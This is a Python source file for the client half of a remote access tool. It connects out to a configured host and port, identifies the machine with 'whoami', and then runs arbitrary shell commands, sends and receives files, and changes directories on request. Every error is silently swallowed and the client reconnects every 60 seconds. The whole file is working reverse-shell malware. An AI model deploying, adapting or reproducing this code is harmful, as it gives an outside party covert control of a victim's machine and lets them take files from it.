from timeout_function_decorator import timeout
from base64 import b64encode, b64decode
from subprocess import getstatusoutput
from os import getcwd, chdir
from os.path import exists
from socket import socket
from json import dumps
from time import sleep

# the target host and port to connect to
host = 'localhost'
port = 5000

# message types
type_png = 0 # ping
type_cmd = 1 # command
type_get = 2 # get file
type_put = 3 # put file
type_hds = 4 # connection handshake
type_out = 5 # output
type_rsp = 6 # file get response
type_cnt = 7 # file content
type_cwd = 8 # change working directory
type_gcd = 9 # get current directory

# functions for getting and setting file content, useful in file transfer
def read_file(path):
    with open(path, 'rb') as file:
        return file.read()

def make_file(path, content):
    with open(path, 'wb') as file:
        file.write(content)

# function for running commands on the system with timeout (30 seconds)
@timeout(30)
def run(*args, **kwargs):
    return getstatusoutput(*args, **kwargs)

# higher level socket class
class Socket():

    def __init__(self, host, port, sock=None, type_max=4, length_max=8, label=None):
        self.host = host # host ip address
        self.port = port # port number
        self.sock = sock if sock else socket() # low-level socket object, creates a new socket by default
        self.type_max = type_max # max bytes in the type segement of the message header
        self.length_max = length_max # max bytes in the length segement of the message header
        self.label = label if label else port # the identifier of the socket, defaults to the port

    def send(self, type, data, timeout=None):
        self.sock.settimeout(timeout)
        
        compressed = b64encode(data) # compress the data
        header = type.to_bytes(self.type_max) + len(compressed).to_bytes(self.length_max) # create the header of the message consisting of the type and length

        self.sock.send(header + compressed) # send the header followed by the compressed content

    def recv(self, timeout=None):
        self.sock.settimeout(timeout)

        type = int.from_bytes(self.sock.recv(self.type_max)) # recv type of message
        length = int.from_bytes(self.sock.recv(self.length_max)) # recv length of message
        compressed = b'' # create a string where the compressed message will be assembled
        
        # add to the message until the full length message has been assembled
        while len(compressed) < length:
            compressed += self.sock.recv(length-len(compressed))

        data = b64decode(compressed) # decompress the message
        return type, data
    
    def expect(self, expected, retrys=2, timeout=None):
        for _ in range(retrys + 1):
            type, data = self.recv(timeout)

            if type == expected:
                return data
            
        raise ValueError('Unexpected value!')

# socket class with client-specific variables and functions 
class Client(Socket):

    def __init__(self, host, port, sock=None, type_max=4, length_max=8, label=None, cwd=None):
        super().__init__(host, port, sock, type_max, length_max, label)
        self.cwd = cwd if cwd else getcwd() # string to keep track of the program's working directory

    def connect(self, attempts=0):
        
        def attempt(): # attempt function which sends client's label after connection if successful
            
            try:
                self.sock.connect((self.host, self.port))
                self.send(type_hds, self.label.encode())
                return True
                
            except (TimeoutError, ConnectionError):
                return
            
        while True if not attempts else attempts: # attempt to connect a specifed number of times or until connected
            if attempt():
                break

# the main loop of the program
def mainloop():
    client = Client(host, port, label=getstatusoutput('whoami')[1]) # initalize client
    client.connect() # connect to server

    # message handling loop
    while True:
        type, data = client.recv() # recv a message with the type

        if type == type_png: # ping
            continue # skip output

        elif type == type_gcd: # send the current working directory if requested
            client.send(type_gcd, getcwd().encode())
            continue # skip output

        elif type == type_cwd: # change working directory
            new_dir = data.decode()

            if exists(new_dir):
                chdir(new_dir)
                output = (0, f'Changed directory to "{getcwd()}"')
            
            else:
                output = (1, 'Directory not found!')

        elif type == type_get: # get file
            path = data.decode()

            if exists(path):
                client.send(type_rsp, b'1') # confirm file exists
                client.send(type_cnt, read_file(path)) # send content
                output = (0, 'Data sent successfully!')
            
            else:
                client.send(type_rsp, b'0') # tells the server not to send the file content
                output = (1, 'File not found!')

        elif type == type_put: # put file
            path = data.decode() # recved output path
            make_file(path, client.expect(type_cnt)) # make the file with the path and recved content
            output = (0, 'Data received successfully!')

        elif type == type_cmd: # regular command
            try:
                output = run(data.decode()) # run the command in the windows cmd
            
            except TimeoutError: # catch timeout and contine the program
                output = (1, 'Command timed out!')

        client.send(type_out, dumps(output).encode())

# a wrapper around the main loop to reconnect of any unmanageable errors occur
while True:
    try:
        mainloop()

    except Exception as err:
        sleep(60)
        continue